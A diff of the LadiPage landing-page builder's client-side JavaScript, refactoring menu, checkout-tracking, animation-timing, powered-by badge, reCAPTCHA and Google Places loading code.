-            d[s].addEventListener('click', a);
-          var c = document.querySelectorAll(
-            '#' +
-              i.runtime.builder_section_popup_id +
-              ' > .ladi-container > .ladi-element[id^="' +
-              i.runtime.builder_popup_menu_mobile_id +
-              '"][data-dropbox="true"] .ladi-element .ladi-menu.list-menu-items .ladi-menu-item'
-          );
-          for (s = 0; s < c.length; s++) c[s].addEventListener('click', r);
-          for (
-            c = document.querySelectorAll(
-              '.ladi-element .ladi-menu.list-menu-items .ladi-menu-item'
-            ),
-              s = 0;
-            s < c.length;
-            s++
-          )
-            o(c[s]),
-              c[s].addEventListener('click', l),
-              c[s].origin == window.location.origin &&
-                c[s].pathname == window.location.pathname &&
-                c[s].classList.add('selected');
-        },
         pt = function (t) {
           var e = { type: 'POPUPX', iframe_id: i.runtime.tmp.popupx_iframe_id };
           Object.keys(t).forEach(function (i) {
@@ -12821,20 +12368,21 @@ var LadiFormulaData = {},
                     : ft(t, e),
                   !0
                 );
-              (d = (l = _t(t)).isCurrentPopup), (s = l.isCurrentSection);
-              [
-                'width',
-                'height',
-                'position',
-                'margin',
-                'top',
-                'left',
-                'bottom',
-                'right',
-                'z-index',
-              ].forEach(function (t) {
-                r[t] = p[t];
-              }),
+              (d = (l = _t(t)).isCurrentPopup),
+                (s = l.isCurrentSection),
+                [
+                  'width',
+                  'height',
+                  'position',
+                  'margin',
+                  'top',
+                  'left',
+                  'bottom',
+                  'right',
+                  'z-index',
+                ].forEach(function (t) {
+                  r[t] = p[t];
+                }),
                 mt(r.width),
                 (c.width = r.width);
               var _ = n[i.runtime.device + '.option.popup_backdrop'];
@@ -12947,212 +12495,6 @@ var LadiFormulaData = {},
               (t
                 ? o.setAttribute('media', 'print')
                 : o.removeAttribute('media'));
-          }
-        },
-        ht = function (t, e, a) {
-          var n,
-            o = null,
-            r = null;
-          if (
-            ('callback_request_with_option' == t &&
-              isFunctionLadiPage(
-                i.runtime.tmp['request_callback_id_' + e.callback_id]
-              ) &&
-              i.runtime.tmp['request_callback_id_' + e.callback_id](
-                e.responseText,
-                e.status,
-                e.httpRequest,
-                e.url
-              ),
-            'set_style_device' == t)
-          ) {
-            if (
-              (vt(e.is_desktop),
-              (r = document.getElementById(
-                i.runtime.tmp.popupx_current_element_id
-              )),
-              isEmptyLadiPage(r))
-            )
-              return;
-            'none' != getComputedStyle(r).display &&
-              (i.runtime.tmp.popupx_is_inline
-                ? ft(i.runtime.tmp.popupx_current_element_id, !1)
-                : yt(i.runtime.tmp.popupx_current_element_id, !1));
-          }
-          if ('set_iframe_info' == t) {
-            isEmptyLadiPage(T) &&
-              ((T = e.ladi_client_id || i.randomId()),
-              window.ladi('LADI_CLIENT_ID').set_cookie(T, 365)),
-              (i.runtime.tmp.popupx_is_desktop = e.is_desktop),
-              (i.runtime.isDesktop = e.is_desktop),
-              (i.runtime.device = i.runtime.isDesktop
-                ? i.const.DESKTOP
-                : i.const.MOBILE),
-              (i.runtime.tmp.popupx_origin_store_id = e.origin_store_id),
-              (i.runtime.tmp.popupx_origin_referer = e.origin_referer),
-              (i.runtime.tmp.popupx_origin_domain = e.origin_domain),
-              (i.runtime.tmp.popupx_origin_url = e.origin_url),
-              (i.runtime.tmp.popupx_is_inline = e.is_inline),
-              vt(e.is_desktop);
-            var l =
-              '#' +
-              i.runtime.builder_section_popup_id +
-              ' .ladi-container {width: 100% !important;}';
-            i.runtime.tmp.popupx_is_inline &&
-              (l +=
-                '.ladi-section > .ladi-section-close {display: none !important;}'),
-              i.createStyleElement('style_popup_container', l),
-              (i.runtime.has_popupx = !0),
-              Lt();
-          }
-          'hide_popupx' == t &&
-            ((o = i.runtime.eventData[e]),
-            (r = document.getElementById(e)),
-            isObjectLadiPage(o) &&
-              !isEmptyLadiPage(r) &&
-              window.ladi(e).hide()),
-            'show_popupx' == t && yt(e, !0),
-            'show_popupx_inline_iframe' == t && ft(e, !0),
-            'mapping_form' == t &&
-              ((n = e),
-              isFunctionLadiPage(i.runtime.tmp.multipleFormRunFormParent) &&
-                i.runtime.tmp.multipleFormRunFormParent(n)),
-            'show_message_callback' == t &&
-              (isFunctionLadiPage(i.runtime.tmp.popupx_show_message_callback) &&
-                i.runtime.tmp.popupx_show_message_callback(),
-              delete i.runtime.tmp.popupx_show_message_callback);
-        },
-        Pt = function () {
-          var t = document.querySelectorAll(
-            '[data-buy-now-ladisales="true"], [data-add-to-cart-ladisales="true"]'
-          );
-          if (0 != t.length) {
-            var e = i.runtime.shopping_ladisales_page_checkout_api_key,
-              a = i.runtime.shopping_ladisales_checkout_config_id;
-            if (!isEmptyLadiPage(e)) {
-              for (
-                var n = function (t) {
-                    t.style.setProperty('cursor', 'pointer'),
-                      t.addEventListener('click', function (e) {
-                        e.stopPropagation(),
-                          (function (t) {
-                            if (isObjectLadiPage(window.LadiSales)) {
-                              var e = {
-                                productID: t.getAttribute('data-product-id'),
-                                productVariantID: t.getAttribute(
-                                  'data-product-variant-id'
-                                ),
-                                quantity: 1,
-                              };
-                              'true' ==
-                                t.getAttribute('data-buy-now-ladisales') &&
-                                isFunctionLadiPage(window.LadiSales.buyNow) &&
-                                window.LadiSales.buyNow(e, {
-                                  callback: function (a) {
-                                    isObjectLadiPage(a) &&
-                                      (i.runEventTracking(null, {
-                                        cart_quantity: e.quantity,
-                                        cart_currency: a.currency_code,
-                                        cart_value: a.price,
-                                        is_form: !1,
-                                        is_add_to_cart: !0,
-                                        is_custom: !0,
-                                        event: { target: t },
-                                      }),
-                                      i.runTimeout(function () {
-                                        i.runEventTracking(null, {
-                                          is_form: !1,
-                                          is_click_buy_now: !0,
-                                          is_custom: !0,
-                                          event: { target: t },
-                                        });
-                                      }, i.runtime.time_delay_click_button));
-                                  },
-                                  callback_order: function (e) {
-                                    i.runEventTracking(null, {
-                                      is_form: !1,
-                                      payment_info: e,
-                                      is_place_an_order: !0,
-                                      is_custom: !0,
-                                      event: { target: t },
-                                    });
-                                  },
-                                  callback_payment: function (e) {
-                                    i.runEventTracking(null, {
-                                      is_form: !1,
-                                      payment_info: e,
-                                      is_complete_payment: !0,
-                                      is_custom: !0,
-                                      event: { target: t },
-                                    });
-                                  },
-                                }),
-                                'true' ==
-                                  t.getAttribute(
-                                    'data-add-to-cart-ladisales'
-                                  ) &&
-                                  isFunctionLadiPage(
-                                    window.LadiSales.cartAdd
-                                  ) &&
-                                  window.LadiSales.cartAdd(e, {
-                                    callback: function (a) {
-                                      isObjectLadiPage(a) &&
-                                        i.runEventTracking(null, {
-                                          cart_quantity: e.quantity,
-                                          cart_currency: a.currency_code,
-                                          cart_value: a.price,
-                                          is_form: !1,
-                                          is_add_to_cart: !0,
-                                          is_custom: !0,
-                                          event: { target: t },
-                                        });
-                                    },
-                                    callback_order: function (e) {
-                                      i.runEventTracking(null, {
-                                        is_form: !1,
-                                        payment_info: e,
-                                        is_place_an_order: !0,
-                                        is_custom: !0,
-                                        event: { target: t },
-                                      });
-                                    },
-                                    callback_payment: function (e) {
-                                      i.runEventTracking(null, {
-                                        is_form: !1,
-                                        payment_info: e,
-                                        is_complete_payment: !0,
-                                        is_custom: !0,
-                                        event: { target: t },
-                                      });
-                                    },
-                                    callback_close: function () {},
-                                  });
-                            }
-                          })(t);
-                      });
-                  },
-                  o = 0;
-                o < t.length;
-                o++
-              )
-                n(t[o]);
-              var r = document.querySelector(
-                'script[src^="' +
-                  i.const.LADISALES_SDK +
-                  '"][data-time="' +
-                  i.runtime.timenow +
-                  '"]'
-              );
-              if (isEmptyLadiPage(r)) {
-                var l = e;
-                isEmptyLadiPage(a) || (l += '_' + a),
-                  i.loadScript(
-                    i.const.LADISALES_SDK,
-                    { id: l, 'data-time': i.runtime.timenow },
-                    !0
-                  );
-              }
-            }
           }
         },
         Lt = function () {
@@ -13619,8 +12961,7 @@ var LadiFormulaData = {},
                       if (!isEmptyLadiPage(o)) {
                         a && o.setAttribute('data-multiple', !0);
                         for (
-                          var r,
-                            l = o.getElementsByClassName(
+                          var l = o.getElementsByClassName(
                               'ladi-survey-select-item'
                             )[0],
                             d = o.getElementsByClassName(
@@ -13898,8 +13239,7 @@ var LadiFormulaData = {},
                           T++
                         )
                           p.push(s[T].getElementsByTagName('input')[0].value),
-                            (r = s[T]),
-                            A(r);
+                            A(s[T]);
                         if (
                           (i.runFormItemOtherChange(s[0]), isEmptyLadiPage(y))
                         ) {
@@ -14249,8 +13589,181 @@ var LadiFormulaData = {},
               });
             }, 300)),
             LadiPageShopping.push(ct),
-            ut(),
-            G(),
+            (function () {
+              for (
+                var t = document.getElementById(i.runtime.backdrop_dropbox_id),
+                  e = 0,
+                  a = function (e) {
+                    e.stopPropagation();
+                    var a = i.findAncestor(e.target, 'ladi-element'),
+                      n = document.querySelector(
+                        '#' +
+                          i.runtime.builder_section_popup_id +
+                          ' > .ladi-container > #' +
+                          i.runtime.builder_popup_menu_mobile_id +
+                          '_' +
+                          a.id
+                      );
+                    if (!isEmptyLadiPage(n)) {
+                      n.setAttribute('data-menu-id', a.id),
+                        n.classList.add('popup-menu-mobile');
+                      var o = n.getElementsByClassName('popup-close')[0];
+                      isEmptyLadiPage(o) &&
+                        (((o = document.createElement('div')).className =
+                          'popup-close'),
+                        o.addEventListener('click', function (e) {
+                          e.stopPropagation(), i.fireEvent(t, 'click');
+                        }),
+                        n.appendChild(o)),
+                        window.ladi(n.id, n).showDropbox(document.body);
+                    }
+                  },
+                  n = function (t) {
+                    if (t.hasAttribute('data-item'))
+                      return t.getAttribute('data-item');
+                    var e = t.getElementsByTagName('a')[0];
+                    return isEmptyLadiPage(e)
+                      ? void 0
+                      : e.getAttribute('data-item');
+                  },
+                  o = function (t) {
+                    isObjectLadiPage(i.runtime.tmp.menu_item_event) ||
+                      (i.runtime.tmp.menu_item_event = {});
+                    var a = String(++e);
+                    (i.runtime.tmp.menu_item_event[a] = n(t)),
+                      (function (t, e) {
+                        var i = t.getElementsByTagName('a')[0];
+                        isEmptyLadiPage(i)
+                          ? t.setAttribute('data-item', e)
+                          : i.setAttribute('data-item', e);
+                      })(t, a);
+                  },
+                  r = function (e) {
+                    e.stopPropagation();
+                    var a = i.findAncestor(e.target, 'ladi-menu-item');
+                    if ('true' != a.getAttribute('data-child')) {
+                      var o = null;
+                      try {
+                        (o = decodeURIComponentLadiPage(
+                          i.runtime.tmp.menu_item_event[n(a)]
+                        )),
+                          (o = JSON.parse(o));
+                      } catch (t) {}
+                      isObjectLadiPage(o) &&
+                        !isEmptyLadiPage(o.type) &&
+                        i.fireEvent(t, 'click');
+                    }
+                  },
+                  l = function (t) {
+                    t.stopPropagation();
+                    var e = i.findAncestor(t.target, 'ladi-menu-item');
+                    if ('true' == e.getAttribute('data-child')) {
+                      e.classList.toggle('open');
+                      var a = i.findAncestor(e, 'popup-menu-mobile');
+                      if (!isEmptyLadiPage(a)) return;
+                    }
+                    var o = null;
+                    try {
+                      (o = decodeURIComponentLadiPage(
+                        i.runtime.tmp.menu_item_event[n(e)]
+                      )),
+                        (o = JSON.parse(o));
+                    } catch (t) {}
+                    if ('true' == e.getAttribute('data-child')) {
+                      var r = (function (t, e) {
+                        if (t.hasAttribute(e)) return t;
+                        var i = t.getElementsByTagName('a')[0];
+                        return !isEmptyLadiPage(i) && i.hasAttribute(e)
+                          ? i
+                          : void 0;
+                      })(e, 'href');
+                      isEmptyLadiPage(r) || r.click();
+                    }
+                    if (isObjectLadiPage(o)) {
+                      o.action_type = i.const.ACTION_TYPE.action;
+                      var l = i.findAncestor(e, 'ladi-element');
+                      i.runtime.tmp.runDataEventNow(l, [o], o);
+                    }
+                  },
+                  d = document.querySelectorAll(
+                    '.ladi-element .ladi-menu.menu-icon-item'
+                  ),
+                  s = 0;
+                s < d.length;
+                s++
+              )
+                d[s].addEventListener('click', a);
+              var c = document.querySelectorAll(
+                '#' +
+                  i.runtime.builder_section_popup_id +
+                  ' > .ladi-container > .ladi-element[id^="' +
+                  i.runtime.builder_popup_menu_mobile_id +
+                  '"][data-dropbox="true"] .ladi-element .ladi-menu.list-menu-items .ladi-menu-item'
+              );
+              for (s = 0; s < c.length; s++) c[s].addEventListener('click', r);
+              for (
+                c = document.querySelectorAll(
+                  '.ladi-element .ladi-menu.list-menu-items .ladi-menu-item'
+                ),
+                  s = 0;
+                s < c.length;
+                s++
+              )
+                o(c[s]),
+                  c[s].addEventListener('click', l),
+                  c[s].origin == window.location.origin &&
+                    c[s].pathname == window.location.pathname &&
+                    c[s].classList.add('selected');
+            })(),
+            (function () {
+              E.forEach(function (t) {
+                var e = document.getElementById(t);
+                if (
+                  !isEmptyLadiPage(e) &&
+                  'true' != e.getAttribute('data-action')
+                ) {
+                  var a = i.runtime.eventData[t],
+                    n = a['option.data_event'];
+                  if (
+                    !isArrayLadiPage(n) &&
+                    ((n = []), isObjectLadiPage(a['option.data_action']))
+                  ) {
+                    var o = i.copy(a['option.data_action']);
+                    (o.action_type = i.const.ACTION_TYPE.action), n.push(o);
+                  }
+                  !(function (t, e) {
+                    e.forEach(function (e) {
+                      if (
+                        e.action_type == i.const.ACTION_TYPE.action &&
+                        e.type == i.const.DATA_ACTION_TYPE.link
+                      )
+                        if (isEmptyLadiPage(t.getAttribute('href')))
+                          t.removeAttribute('href');
+                        else {
+                          var a = i.getLinkUTMRedirect(t.href, null);
+                          t.setAttribute('data-replace-href', a),
+                            (t.href = i.convertDataReplaceStr(a, !0));
+                        }
+                    });
+                  })(e, n);
+                }
+              });
+              for (
+                var t = document.querySelectorAll(
+                    '.ladi-headline a[href], .ladi-paragraph a[href], .ladi-list-paragraph a[href]'
+                  ),
+                  e = 0;
+                e < t.length;
+                e++
+              )
+                if (isEmptyLadiPage(t[e].getAttribute('href')))
+                  t[e].removeAttribute('href');
+                else {
+                  var a = i.getLinkUTMRedirect(t[e].href, null);
+                  t[e].setAttribute('data-replace-href', a),
+                    (t[e].href = i.convertDataReplaceStr(a, !0));
+                }
+            })(),
             t &&
               (i.runtime.is_popupx ||
                 i.const.TIME_ONPAGE_TRACKING.forEach(function (t) {
@@ -14371,14 +13884,6 @@ var LadiFormulaData = {},
             })(),
             (function () {
               var t = 2500,
-                e = 3800,
-                a = 800,
-                n = 50,
-                o = 150,
-                r = 500,
-                l = 1300,
-                d = 600,
-                s = 1500,
                 c = t,
                 u = function (u) {
                   var p = !1;
@@ -14491,7 +13996,7 @@ var LadiFormulaData = {},
                                     ),
                                   i.runTimeout(function () {
                                     E(t);
-                                  }, d + s))
+                                  }, 2100))
                                 : (v(t.querySelectorAll('i')[0], t, !1, e),
                                   t.classList.add('is-visible'),
                                   t.classList.remove('is-hidden')));
@@ -14520,13 +14025,13 @@ var LadiFormulaData = {},
                                         P(s, c),
                                         i.runTimeout(function () {
                                           E(c);
-                                        }, e),
+                                        }, 3800),
                                         i.runTimeout(function () {
                                           i.findAncestor(
                                             s,
                                             'ladipage-animated-words-wrapper'
                                           ).classList.add('is-loading');
-                                        }, a))
+                                        }, 800))
                                     : (i
                                         .findAncestor(
                                           s,
@@ -14535,13 +14040,13 @@ var LadiFormulaData = {},
                                         .style.setProperty('width', '2px'),
                                       i.runTimeout(function () {
                                         P(s, c), L(c);
-                                      }, d));
+                                      }, 600));
                                 else {
                                   var u =
                                     s.querySelectorAll('i').length >=
                                     c.querySelectorAll('i').length;
-                                  f(s.querySelectorAll('i')[0], s, u, n),
-                                    v(c.querySelectorAll('i')[0], c, u, n);
+                                  f(s.querySelectorAll('i')[0], s, u, 50),
+                                    v(c.querySelectorAll('i')[0], c, u, 50);
                                 }
                               else {
                                 var p = i.findAncestor(
@@ -14561,10 +14066,10 @@ var LadiFormulaData = {},
                                     )
                                       t[e].classList.remove('in'),
                                         t[e].classList.add('out');
-                                  }, r),
+                                  }, 500),
                                   i.runTimeout(function () {
-                                    L(c, o);
-                                  }, l);
+                                    L(c, 150);
+                                  }, 1300);
                               }
                             }
                           },
@@ -14643,10 +14148,10 @@ var LadiFormulaData = {},
                           })(document.querySelectorAll('.letters b')),
                           u.classList.contains('loading-bar'))
                         )
-                          (c = e),
+                          (c = 3800),
                             i.runTimeout(function () {
                               m.classList.add('is-loading');
-                            }, a);
+                            }, 800);
                         else if (u.classList.contains('clip')) {
                           var O = m.clientWidth + 5;
                           m.style.setProperty('width', O + 'px');
@@ -14765,7 +14270,143 @@ var LadiFormulaData = {},
                   );
               }
             })(),
-            Pt(),
+            (function () {
+              var t = document.querySelectorAll(
+                '[data-buy-now-ladisales="true"], [data-add-to-cart-ladisales="true"]'
+              );
+              if (0 != t.length) {
+                var e = i.runtime.shopping_ladisales_page_checkout_api_key,
+                  a = i.runtime.shopping_ladisales_checkout_config_id;
+                if (!isEmptyLadiPage(e)) {
+                  for (
+                    var n = function (t) {
+                        t.style.setProperty('cursor', 'pointer'),
+                          t.addEventListener('click', function (e) {
+                            e.stopPropagation(),
+                              (function (t) {
+                                if (isObjectLadiPage(window.LadiSales)) {
+                                  var e = {
+                                    productID:
+                                      t.getAttribute('data-product-id'),
+                                    productVariantID: t.getAttribute(
+                                      'data-product-variant-id'
+                                    ),
+                                    quantity: 1,
+                                  };
+                                  'true' ==
+                                    t.getAttribute('data-buy-now-ladisales') &&
+                                    isFunctionLadiPage(
+                                      window.LadiSales.buyNow
+                                    ) &&
+                                    window.LadiSales.buyNow(e, {
+                                      callback: function (a) {
+                                        isObjectLadiPage(a) &&
+                                          (i.runEventTracking(null, {
+                                            cart_quantity: e.quantity,
+                                            cart_currency: a.currency_code,
+                                            cart_value: a.price,
+                                            is_form: !1,
+                                            is_add_to_cart: !0,
+                                            is_custom: !0,
+                                            event: { target: t },
+                                          }),
+                                          i.runTimeout(function () {
+                                            i.runEventTracking(null, {
+                                              is_form: !1,
+                                              is_click_buy_now: !0,
+                                              is_custom: !0,
+                                              event: { target: t },
+                                            });
+                                          }, i
+                                            .runtime.time_delay_click_button));
+                                      },
+                                      callback_order: function (e) {
+                                        i.runEventTracking(null, {
+                                          is_form: !1,
+                                          payment_info: e,
+                                          is_place_an_order: !0,
+                                          is_custom: !0,
+                                          event: { target: t },
+                                        });
+                                      },
+                                      callback_payment: function (e) {
+                                        i.runEventTracking(null, {
+                                          is_form: !1,
+                                          payment_info: e,
+                                          is_complete_payment: !0,
+                                          is_custom: !0,
+                                          event: { target: t },
+                                        });
+                                      },
+                                    }),
+                                    'true' ==
+                                      t.getAttribute(
+                                        'data-add-to-cart-ladisales'
+                                      ) &&
+                                      isFunctionLadiPage(
+                                        window.LadiSales.cartAdd
+                                      ) &&
+                                      window.LadiSales.cartAdd(e, {
+                                        callback: function (a) {
+                                          isObjectLadiPage(a) &&
+                                            i.runEventTracking(null, {
+                                              cart_quantity: e.quantity,
+                                              cart_currency: a.currency_code,
+                                              cart_value: a.price,
+                                              is_form: !1,
+                                              is_add_to_cart: !0,
+                                              is_custom: !0,
+                                              event: { target: t },
+                                            });
+                                        },
+                                        callback_order: function (e) {
+                                          i.runEventTracking(null, {
+                                            is_form: !1,
+                                            payment_info: e,
+                                            is_place_an_order: !0,
+                                            is_custom: !0,
+                                            event: { target: t },
+                                          });
+                                        },
+                                        callback_payment: function (e) {
+                                          i.runEventTracking(null, {
+                                            is_form: !1,
+                                            payment_info: e,
+                                            is_complete_payment: !0,
+                                            is_custom: !0,
+                                            event: { target: t },
+                                          });
+                                        },
+                                        callback_close: function () {},
+                                      });
+                                }
+                              })(t);
+                          });
+                      },
+                      o = 0;
+                    o < t.length;
+                    o++
+                  )
+                    n(t[o]);
+                  var r = document.querySelector(
+                    'script[src^="' +
+                      i.const.LADISALES_SDK +
+                      '"][data-time="' +
+                      i.runtime.timenow +
+                      '"]'
+                  );
+                  if (isEmptyLadiPage(r)) {
+                    var l = e;
+                    isEmptyLadiPage(a) || (l += '_' + a),
+                      i.loadScript(
+                        i.const.LADISALES_SDK,
+                        { id: l, 'data-time': i.runtime.timenow },
+                        !0
+                      );
+                  }
+                }
+              }
+            })(),
             et(null, !1),
             W(),
             (function () {
@@ -14832,7 +14473,292 @@ var LadiFormulaData = {},
                 a.addEventListener('click', i.runEventBackdropDropboxClick);
             })(),
             i.reloadLazyload(!0),
-            z(),
+            (function () {
+              if (t) {
+                var e = function () {
+                    if (
+                      ((i.runtime.ladipage_powered_by_classname =
+                        i.randomString(i.randomInt(6, 32))),
+                      i.runtime.isClient)
+                    ) {
+                      var t = document.createElement('div');
+                      document.body.insertBefore(
+                        t,
+                        document.body.childNodes[
+                          i.randomInt(0, document.body.childNodes.length)
+                        ]
+                      ),
+                        (t.className = i.runtime.ladipage_powered_by_classname);
+                      var e =
+                          '.' +
+                          i.runtime.ladipage_powered_by_classname +
+                          ' {width: 140px; height: 30px; position: fixed; bottom: -40px; left: 10px; z-index: 10000000000; background: url("' +
+                          i.const.POWERED_BY_IMAGE +
+                          '") no-repeat center #fafafa; background-size: 90% 70%; border-radius: 4px 4px 0 0; display: block; animation: ' +
+                          i.runtime.ladipage_powered_by_classname +
+                          ' 10s;} @keyframes ' +
+                          i.runtime.ladipage_powered_by_classname +
+                          ' {0% {bottom: -40px;} 10% {bottom: 0;} 90% {bottom: 0;} 100% {bottom: -40px;}}',
+                        a = document.createElement('style');
+                      (a.type = 'text/css'),
+                        document.head.insertBefore(
+                          a,
+                          document.head.childNodes[
+                            i.randomInt(0, document.head.childNodes.length)
+                          ]
+                        ),
+                        (a.innerHTML = e),
+                        i.runTimeout(function () {
+                          isEmptyLadiPage(t) || t.parentElement.removeChild(t),
+                            isEmptyLadiPage(a) ||
+                              a.parentElement.removeChild(a);
+                        }, 1e4);
+                    }
+                  },
+                  a = !1,
+                  n = isArrayLadiPage(i.runtime.DOMAIN_FREE)
+                    ? i.runtime.DOMAIN_FREE
+                    : [],
+                  o = window.location.href;
+                ['/', '.', '/'].forEach(function (t) {
+                  for (; o.endsWith(t); ) o = o.substr(0, o.length - t.length);
+                });
+                var r = i.getElementAHref(o).host.toLowerCase();
+                n.forEach(function (t) {
+                  a || (a = r.endsWith(t.toLowerCase()));
+                }),
+                  a && i.runTimeout(e, 3e3),
+                  B('PageView', {}, function (t, n) {
+                    if ((-1 != t || a || i.runTimeout(e, 3e3), 200 == t)) {
+                      var o = JSON.parse(n),
+                        r = !1,
+                        l = null,
+                        d = null,
+                        s = !1;
+                      isObjectLadiPage(o.data)
+                        ? ((r = 1 == o.data.verified_domain),
+                          (l = o.data.google_captcha),
+                          (d = o.data.places_autocomplete),
+                          (s = o.data.is_expires))
+                        : (r = 1 == o.data),
+                        a || r || i.runTimeout(e, 3e3),
+                        isObjectLadiPage(l) &&
+                          (function (t, e, a) {
+                            if (!isEmptyLadiPage(t)) {
+                              var n = !1;
+                              a.type ==
+                                i.const.FORM_CONFIG_TYPE
+                                  .google_recaptcha_enterprise && (e = !0),
+                                a.type ==
+                                  i.const.FORM_CONFIG_TYPE
+                                    .google_recaptcha_checkbox && (n = !0),
+                                (i.runtime.tmp.google_captcha = {
+                                  api_key: t,
+                                  enterprise: e,
+                                  checkbox: n,
+                                  type: a.type,
+                                }),
+                                (window.onloadRecaptchaCheckboxCallback =
+                                  function () {
+                                    for (
+                                      var e = function (e) {
+                                          var i = document.createElement('div');
+                                          (i.className =
+                                            'ladi-google-recaptcha-checkbox'),
+                                            e.insertBefore(i, a[n]);
+                                          var o = window.grecaptcha.render(i, {
+                                            sitekey: t,
+                                          });
+                                          i.setAttribute('data-widget-id', o);
+                                        },
+                                        a = document.querySelectorAll(
+                                          '.ladi-form .ladi-button'
+                                        ),
+                                        n = 0;
+                                      n < a.length;
+                                      n++
+                                    ) {
+                                      var o = i.findAncestor(
+                                          a[n],
+                                          'ladi-element'
+                                        ),
+                                        r = i.findAncestor(o, 'ladi-form');
+                                      if (!isEmptyLadiPage(r)) {
+                                        r = i.findAncestor(r, 'ladi-element');
+                                        var l = i.runtime.eventData[r.id];
+                                        if (!isEmptyLadiPage(l)) {
+                                          if (
+                                            l['option.is_form_login'] ||
+                                            l['option.is_form_otp'] ||
+                                            l['option.is_form_coupon'] ||
+                                            l['option.is_add_to_cart']
+                                          )
+                                            continue;
+                                          if (
+                                            isObjectLadiPage(
+                                              l['option.form_setting']
+                                            ) &&
+                                            l['option.form_setting']
+                                              .is_multiple &&
+                                            !l['option.form_setting']
+                                              .is_multiple_otp
+                                          )
+                                            continue;
+                                        }
+                                      }
+                                      e(o);
+                                    }
+                                    for (
+                                      var d = document.querySelectorAll(
+                                          '#POPUP_CHECKOUT .ladi-button'
+                                        ),
+                                        s = 0;
+                                      s < d.length;
+                                      s++
+                                    ) {
+                                      var c = i.findAncestor(
+                                          d[s],
+                                          'ladi-element'
+                                        ),
+                                        u = i.runtime.eventData[c.id];
+                                      isEmptyLadiPage(u) ||
+                                        isEmptyLadiPage(
+                                          u['option.data_submit_form_id']
+                                        ) ||
+                                        !u['option.is_submit_form'] ||
+                                        e(c);
+                                    }
+                                  }),
+                                e
+                                  ? i.loadScript(
+                                      'https://www.google.com/recaptcha/enterprise.js?render=' +
+                                        t +
+                                        '&hl=' +
+                                        i.runtime.lang
+                                    )
+                                  : n
+                                  ? i.loadScript(
+                                      'https://www.google.com/recaptcha/api.js?onload=onloadRecaptchaCheckboxCallback&render=explicit&hl=' +
+                                        i.runtime.lang
+                                    )
+                                  : i.loadScript(
+                                      'https://www.google.com/recaptcha/api.js?render=' +
+                                        t
+                                    );
+                            }
+                          })(l.site_key, l.enterprise, l),
+                        isObjectLadiPage(d) &&
+                          ((c = d.api_key),
+                          isEmptyLadiPage(c) ||
+                            ((window.onloadGooglePlacesAutocompleteCallback =
+                              function () {
+                                var t = document.querySelectorAll(
+                                    '[data-places-autocomplete-country]'
+                                  ),
+                                  e = null,
+                                  i = 0,
+                                  a = {},
+                                  n = function (n) {
+                                    for (i = 0; i < t.length; i++)
+                                      (e = t[i].querySelector(
+                                        'input[name="address"]'
+                                      )).removeAttribute('data-focus');
+                                    (e = n.target).setAttribute(
+                                      'data-focus',
+                                      !0
+                                    ),
+                                      (a = e.getAttribute('data-attrs')),
+                                      isEmptyLadiPage(a) &&
+                                        (((a = {
+                                          style: e.getAttribute('style'),
+                                          placeholder:
+                                            e.getAttribute('placeholder'),
+                                          disabled: e.disabled,
+                                        }).style = isEmptyLadiPage(a.style)
+                                          ? ''
+                                          : a.style),
+                                        (a.placeholder = isEmptyLadiPage(
+                                          a.placeholder
+                                        )
+                                          ? ''
+                                          : a.placeholder),
+                                        (a.disabled =
+                                          !isNullLadiPage(a.disabled) &&
+                                          a.disabled),
+                                        e.setAttribute(
+                                          'data-attrs',
+                                          encodeURIComponent(JSON.stringify(a))
+                                        ));
+                                  };
+                                for (i = 0; i < t.length; i++) {
+                                  var o = t[i].getAttribute(
+                                      'data-places-autocomplete-country'
+                                    ),
+                                    r = { types: ['address'] };
+                                  (o = isEmptyLadiPage(o)
+                                    ? []
+                                    : (o = (o =
+                                        o.split(',')).removeSpace()).unique())
+                                    .length > 0 &&
+                                    (r.componentRestrictions = { country: o }),
+                                    (e = t[i].querySelector(
+                                      'input[name="address"]'
+                                    )).addEventListener('focus', n),
+                                    new google.maps.places.Autocomplete(e, r);
+                                }
+                                t.length > 0 &&
+                                  (window.gm_authFailure = function () {
+                                    for (i = 0; i < t.length; i++)
+                                      (e = t[i].querySelector(
+                                        'input[name="address"]'
+                                      )),
+                                        (a = e.getAttribute('data-attrs')),
+                                        (a = isEmptyLadiPage(a)
+                                          ? {
+                                              style: '',
+                                              placeholder: '',
+                                              disabled: !1,
+                                            }
+                                          : JSON.parse(
+                                              decodeURIComponentLadiPage(a)
+                                            )),
+                                        e.setAttribute('style', a.style),
+                                        e.setAttribute(
+                                          'placeholder',
+                                          a.placeholder
+                                        ),
+                                        (e.disabled = a.disabled),
+                                        'true' ==
+                                          e.getAttribute('data-focus') &&
+                                          e.focus();
+                                  });
+                              }),
+                            i.loadScript(
+                              'https://maps.googleapis.com/maps/api/js?key=' +
+                                c +
+                                '&libraries=places&callback=onloadGooglePlacesAutocompleteCallback'
+                            ))),
+                        s &&
+                          (function () {
+                            if (!window.next && !isEmptyLadiPage(T)) {
+                              var t = i.const.LANG.EXPIRES_TITLE,
+                                e = i.const.LANG.EXPIRES_DESC;
+                              i.showMessage(
+                                `\n            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&amp;display=swap" rel="stylesheet" type="text/css">\n            <style>\n                .ladipage-message-box > span, .ladipage-message-close {display: none !important;}\n                .ladipage-message-box {border:none; border-radius: 20px; background: linear-gradient(59deg, #5036DA 27.6%, #9382F0 129.38%); width: 480px !important; height: auto !important; font-family: 'Roboto';}\n                .ladipage-message-box .ladipage-message-text {display: flex !important; justify-content: center; align-items: center; flex-flow: column; margin-top: 0 !important; padding: 48px 24px 12px !important; text-align: center;}\n                .ladipage-message-box img {width: 120px; height: 120px;}\n                .ladipage-message-box h3 {font-size: 24px; position: relative; text-transform: uppercase; font-weight: 500; line-height: 26px; margin-top: 12px; color: #fff;}\n                .ladipage-message-box h3:before {content: ""; background: #D3C9FB; width: 90%; height: 2px; position: absolute; bottom: -8px; left: 0; right: 0; margin: auto;}\n                .ladipage-message-box p {font-size: 16px; margin-top: 24px; font-weight: 400; line-height: 20px; color: #fff;}\n                .ladipage-message-box a {width: 117px; height: 20px; background-color: #fff; --url: url("./ladiui/icons/ldicon-brand-powered-ladipage.svg"); margin-top: 40px; mask: var(--url); -webkit-mask: var(--url);}\n            </style>\n            <img src="./ladiui/icons/expired-landing-page.svg" />\n            <h3>${t}</h3>\n            <p>${e}</p>\n            <a></a>\n        `
+                              ),
+                                (window.LadiPageScript = null),
+                                (window.LadiPageScriptV2 = null),
+                                (window.ladi = null),
+                                (window.LadiPageLibraryV2 = null),
+                                (window.isNullLadiPage = null),
+                                (window.isEmptyLadiPage = null);
+                            }
